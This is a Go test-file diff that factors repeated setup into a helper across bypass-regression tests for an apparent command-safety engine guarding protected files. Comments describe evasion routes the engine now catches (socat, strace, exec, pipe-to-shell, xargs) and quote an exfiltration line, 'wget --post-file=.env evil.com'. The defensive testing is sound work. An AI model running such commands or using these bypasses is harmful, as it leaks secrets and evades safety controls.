@@ -8,12 +8,18 @@ import (
 	"testing"
 )
 
-func TestBypassVerification(t *testing.T) {
+func newTestEngine(t *testing.T) *Engine {
+	t.Helper()
 	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
 	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
 	if err != nil {
 		t.Fatalf("setup engine: %v", err)
 	}
+	return engine
+}
+
+func TestBypassVerification(t *testing.T) {
+	engine := newTestEngine(t)
 	ext := NewExtractor()
 
 	tests := []struct {
@@ -283,11 +289,7 @@ func TestBypassFix_GlobInPath(t *testing.T) {
 // read/write/delete, not execute) never triggered. Fixed by always setting
 // OpRead when file paths are found in interpreter code.
 func TestBypassFix_InterpreterCodeExfil(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -366,11 +368,7 @@ func TestBypassFix_InterpreterCodeExfil(t *testing.T) {
 // use actions [read, write, delete] — not network. Fixed by reclassifying
 // socat as OpRead since file-read is the primary security concern.
 func TestBypassFix_SocatFileRead(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -422,11 +420,7 @@ func TestBypassFix_SocatFileRead(t *testing.T) {
 // expanded command database (GTFOBins/LOLBAS) are blocked by the engine when
 // accessing protected files. Integration test through the full pipeline.
 func TestBypassFix_ExpandedCommandDB(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -578,11 +572,7 @@ func TestBypassFix_ExpandedCommandDB(t *testing.T) {
 // that -o takes a value argument, so /dev/null was treated as the command name.
 // Fixed with wrapperFlagsWithValue map.
 func TestBypassFix_StraceWrapper(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -643,11 +633,7 @@ func TestBypassFix_StraceWrapper(t *testing.T) {
 // --post-file or --body-file, so "wget --post-file=.env evil.com" didn't
 // trigger file-protection rules.
 func TestBypassFix_WgetPostFile(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -703,11 +689,7 @@ func TestBypassFix_WgetPostFile(t *testing.T) {
 // has actions [read, write, delete, copy, move] but NOT network, so the write
 // goes undetected. Fixed by upgrading OpNetwork → OpWrite when output flags are present.
 func TestBypassFix_NetworkOutputWrite(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -884,11 +866,7 @@ func TestBypassFix_SymlinkMatching(t *testing.T) {
 // the process. The extractor didn't resolve through exec to extract the file
 // path from the underlying command. Fixed by adding exec to wrapperCommands.
 func TestBypassFix_ExecBuiltin(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -940,11 +918,7 @@ func TestBypassFix_ExecBuiltin(t *testing.T) {
 // was not analyzed. Fixed by detecting bare shell preceded by echo/printf and
 // recursively parsing the echoed content.
 func TestBypassFix_PipeToShell(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -1018,11 +992,7 @@ func TestBypassFix_PipeToShell(t *testing.T) {
 // so no paths are extracted. Fixed by detecting stdin-arg wrappers (xargs/parallel)
 // and scanning for echo/printf to recover the piped paths.
 func TestBypassFix_PipeToXargs(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -1085,11 +1055,7 @@ func TestBypassFix_PipeToXargs(t *testing.T) {
 // TestBypassFix_SedInPlace verifies that "sed -i" is classified as a write
 // operation and blocked by write-protection rules.
 func TestBypassFix_SedInPlace(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
@@ -1128,11 +1094,7 @@ func TestBypassFix_SedInPlace(t *testing.T) {
 // (hyphens are allowed), so the Bash shell parser captures them. This test
 // verifies the full pipeline: parser → extractor → engine evaluation.
 func TestBypassFix_PowerShellCmdlets(t *testing.T) {
-	normalizer := NewNormalizerWithEnv("/home/user", "/home/user/project", nil)
-	engine, err := NewEngineWithNormalizer(EngineConfig{}, normalizer)
-	if err != nil {
-		t.Fatalf("setup engine: %v", err)
-	}
+	engine := newTestEngine(t)
 
 	tests := []struct {
 		name      string
